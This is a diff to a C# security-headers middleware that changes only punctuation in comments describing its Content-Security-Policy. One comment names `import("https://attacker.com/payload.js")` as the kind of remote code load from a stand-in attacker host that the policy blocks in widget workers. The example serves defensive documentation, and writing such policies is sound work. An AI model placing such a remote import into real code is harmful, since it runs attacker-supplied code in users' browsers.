@@ -12,13 +12,13 @@ internal static class SecurityHeadersMiddleware
 
     // CSP: applied to HTML responses (the panel SPA + any /panel/* shell).
     // Module workers inherit their creator document's CSP, so a policy here
-    // also gates `import()` calls inside Tier 2 widget workers — blocking
+    // also gates `import()` calls inside Tier 2 widget workers - blocking
     // `import("https://attacker.com/payload.js")` while still allowing
     // same-origin sibling imports under /apps-api/code/...
     //
     // 'unsafe-inline' on script-src/style-src is required for the SPA's
     // bootstrap script + React inline styles. It doesn't widen the
-    // worker-import attack surface — `import()` resolution checks
+    // worker-import attack surface - `import()` resolution checks
     // host-source matches against the URL's origin, not against inline.
     //
     // Image whitelist covers Steam (avatars/game icons/game headers from
